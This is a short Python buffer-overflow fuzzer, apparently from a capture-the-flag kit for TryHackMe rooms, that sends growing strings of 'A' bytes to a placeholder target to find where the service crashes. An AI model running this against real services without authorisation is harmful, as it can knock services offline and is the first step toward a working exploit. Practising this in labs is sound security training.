#!/usr/bin/env python3
"""
bof_fuzz.py — Generic buffer overflow fuzzer.
Sends increasing payloads over TCP to find the crash threshold.

Configure HOST, PORT, START, STEP, and MAX before running.

Used in: Brainstorm, Brainpan 1, Gatekeeper (TryHackMe)
"""
import socket
import time

HOST = "TARGET_IP"
PORT = 9999
START = 100
STEP = 100
MAX = 3000
TIMEOUT = 5

for size in range(START, MAX, STEP):
    print(f"[*] Sending {size} bytes")
    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.settimeout(TIMEOUT)
        s.connect((HOST, PORT))
        s.recv(1024)
        s.sendall(b"A" * size + b"\r\n")
        s.close()
        time.sleep(1)
    except Exception as e:
        print(f"[!] Crashed or disconnected around {size} bytes: {e}")
        break
